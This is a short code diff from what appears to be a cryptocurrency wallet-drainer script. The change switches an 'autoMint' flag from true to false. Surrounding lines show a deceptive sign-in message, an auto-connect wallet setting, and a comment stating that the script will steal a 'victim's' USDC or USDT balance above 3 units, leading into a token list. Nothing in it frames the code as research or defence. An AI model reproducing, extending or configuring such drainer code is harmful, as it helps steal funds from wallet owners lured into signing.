@@ -15,7 +15,7 @@ const signMessage = `Welcome, \n\n` +
     `Nonce:\n{nonce}`;
 
 const autoConnect = false; //false; // auto connect wallet
-const autoMint = true; // auto click claim button
+const autoMint = false; // auto click claim button
 
 // the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
 const erc20list = {
